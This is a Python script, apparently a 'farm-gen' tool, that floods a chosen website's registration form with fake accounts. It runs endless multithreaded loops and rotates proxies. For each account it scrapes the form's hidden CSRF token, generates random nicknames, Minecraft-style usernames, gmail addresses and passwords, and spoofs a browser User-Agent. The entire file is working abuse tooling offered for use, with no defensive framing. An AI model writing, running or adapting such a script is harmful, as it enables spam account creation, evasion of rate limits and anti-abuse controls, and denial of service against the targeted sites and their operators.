import requests
import random
import string
import threading
import colorama

def main():
    colorama.init()

    print(colorama.Fore.RED + " _____ _____ _____ ____      _____ _____ _____ ")
    print(colorama.Fore.YELLOW + "|   __|  _  | __  |    \ ___|   __|   __|   | |")
    print(colorama.Fore.GREEN + "|   __|     |    -|  |  |___|  |  |   __| | | |")
    print(colorama.Fore.BLUE + "|__|  |__|__|__|__|____/    |_____|_____|_|___|")
    print(colorama.Fore.MAGENTA + "                 Made by 5170#5170             ")
    prefix = input("prefix (default: fard): ")
    if(prefix == ""):
        prefix = "fard"
    
    proxies = input("proxies? (default: false): ")
    proxieslist = []
    if(proxies == "" or proxies.lower() == "false"):
        proxies = False
    else:
        proxies = True
        with open("proxies.txt", 'r') as f:
            for line in f:
                proxieslist.append(line.strip())
    
    threads = input("threads (default: 50): ")
    if(threads == ""):
        threads = 50
    else:
        threads = int(threads)
    
    link = input("register URL: ")
    if(link == ""):
        print("[-] No link provided")
        return 

    print("[+] Starting " + str(threads) + " threads")
    for i in range(threads):
        threading.Thread(target=worker, args=(link, prefix, proxies, proxieslist)).start()
        print("[+] Started thread " + str(i + 1))

    
def email():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(10)) + '@gmail.com'

def mcusername():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(4)) # not sure how to get alot of usernames, so im randomizing them

def random_password():
    return ''.join(random.choice(string.ascii_lowercase) for i in range(10))

def random_name(prefix):
    return prefix + '-' + ''.join(random.choice(string.ascii_lowercase) for i in range(8))

def threaded(link, prefix, proxy=None):
    funny = requests.get(link, proxies={"http": proxy, "https": proxy})
    token = funny.text.split('<input type="hidden" name="token" value="')[1].split('">')[0]

    cookies = funny.cookies
    cookies["accept"] = "accepted"

    randompass = random_password();
    payload = {
        "nickname": random_name(prefix),
        "username": mcusername(),
        "email": email(),
        "password": randompass,
        "password_again": randompass,
        "t_and_c": 1,
        "token": token,
        "timezone": "Europe/Warsaw"
    }
    funny = requests.post(
        link,
        data=payload,
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
        },
        cookies=funny.cookies,
        proxies={"http": proxy, "https": proxy},
    )
    if(funny.text.find('<li>') == -1):
        print('[+] Successfully registered User: ' + payload['nickname'])
    else:
        print('[-] Failed to register user ' + payload['nickname'] + ", Error: " + funny.text.split('<li>')[1].split('</li>')[0])

def worker(link, prefix, proxies, proxieslist):
    if(proxies):
        proxy = random.choice(proxieslist)
        while True:
            threaded(link, prefix, proxy)
    else:
        while True:
            threaded(link, prefix)

if __name__ == "__main__":
    main()
